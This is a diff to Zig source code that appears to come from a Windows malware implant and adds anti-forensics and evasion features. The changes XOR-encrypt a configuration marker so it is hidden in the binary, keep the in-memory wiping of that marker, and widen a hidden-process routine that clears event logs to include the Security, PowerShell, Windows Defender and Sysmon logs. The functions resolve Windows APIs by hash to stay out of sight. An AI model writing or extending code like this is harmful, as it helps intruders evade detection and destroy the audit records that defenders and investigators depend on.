@@ -54,7 +54,10 @@ pub fn removeDetectionSignatures() bool {
 
     const section_headers = @as([*]types.IMAGE_SECTION_HEADER, @ptrCast(@as(*align(1) types.IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(nt) + @sizeOf(types.IMAGE_NT_HEADERS64) - @sizeOf(types.IMAGE_OPTIONAL_HEADER64) + nt.FileHeader.SizeOfOptionalHeader))));
 
-    const marker = "MIRAGECFG";
+    const enc_marker = comptime hash.xorEncrypt("MIRAGECFG");
+    var marker_buf: [enc_marker.len]u8 = undefined;
+    hash.xorDecrypt(&enc_marker, &marker_buf);
+    const marker = marker_buf[0..enc_marker.len];
     for (0..nt.FileHeader.NumberOfSections) |i| {
         const s = &section_headers[i];
         const va = s.VirtualAddress;
@@ -76,7 +79,7 @@ pub fn removeDetectionSignatures() bool {
             ) < 0) return false;
 
             var bytes_written: types.SIZE_T = 0;
-            const zeros = [_]u8{ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+            var zeros: [9]u8 = .{0} ** 9;
             const write_ok = engine.NtWriteVirtualMemory(
                 @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
                 target,
@@ -105,7 +108,12 @@ pub fn clearEventLogs() bool {
     const create_proc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
     const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(create_proc));
 
-    const logs = [_][]const u8{ "Application", "System" };
+    const logs = [_][]const u8{
+        "Application", "System", "Security",
+        "Windows PowerShell",
+        "Microsoft-Windows-Windows Defender/Operational",
+        "Microsoft-Windows-Sysmon/Operational",
+    };
     var any_ok = false;
     for (logs) |log_name| {
         var cmd_buf: [260]u16 = undefined;
@@ -121,10 +129,9 @@ pub fn clearEventLogs() bool {
         }
         cmd_buf[pos] = 0;
 
-        var si: [68]u8 = undefined;
-        @memset(&si, 0);
-        var pi: [16]u8 = undefined;
-        @memset(&pi, 0);
+        var si = std.mem.zeroes(types.STARTUPINFOW);
+        si.cb = @sizeOf(types.STARTUPINFOW);
+        var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
 
         if (CreateProcessW(null, @ptrCast(&cmd_buf), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0) {
             any_ok = true;
